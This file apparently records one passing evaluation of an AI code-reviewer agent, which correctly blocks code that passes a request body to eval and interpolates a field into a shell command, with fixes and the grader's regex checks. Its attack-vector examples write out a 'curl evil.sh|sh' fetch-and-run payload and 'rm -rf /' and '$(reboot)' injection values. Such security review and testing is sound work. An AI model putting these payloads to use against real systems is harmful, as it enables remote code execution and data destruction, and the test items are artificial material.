@@ -1,0 +1,63 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "prompt_hash": "a02cc5410b11db1a62c0d90f21c97a686eacb0bb19a0a3793c982827e634dda2",
+  "output": "**BLOCK**\n\n**1. [blocking] Code injection via `eval` on untrusted request body — CWE-94**\nEvidence: `const payload = eval('(' + req.body + ')');`\n`req.body` is attacker-controlled. `eval` executes it as JavaScript, not just parses it. Attack vector: a request body of `require('child_process').execSync('curl evil.sh|sh')` runs arbitrary code in the server process.\nFix: parse, do not evaluate: `const payload = JSON.parse(req.body);` (wrap in try/catch and validate shape).\n\n**2. [blocking] OS command injection via shell interpolation — CWE-78**\nEvidence: `exec(`deploy.sh ${payload.target}`);`\n`payload.target` derives from the request and is interpolated into a shell command string. Attack vector: `target` = `x; rm -rf / #` or `$(reboot)` executes injected commands.\nFix: use `execFile('deploy.sh', [payload.target])` (argument array, no shell), and validate `payload.target` against an allowlist/regex before use.\n\nBoth lines are exploitable independently; either alone is a remote code execution vector.",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?im)^\\s*(?:(?:##\\s*)?Verdict:\\s*)?(?:\\*\\*)?BLOCK(?:\\*\\*)?(?:\\b|:)"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-94"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-78|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)eval|exec"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)evidence|attack vector"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)fix|replace|execFile|JSON\\.parse"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    }
+  ],
+  "status": "pass",
+  "passed": true,
+  "input_tokens": 2,
+  "output_tokens": 520,
+  "cost_usd": 0.027513999999999997,
+  "duration_ms": 9354
+}
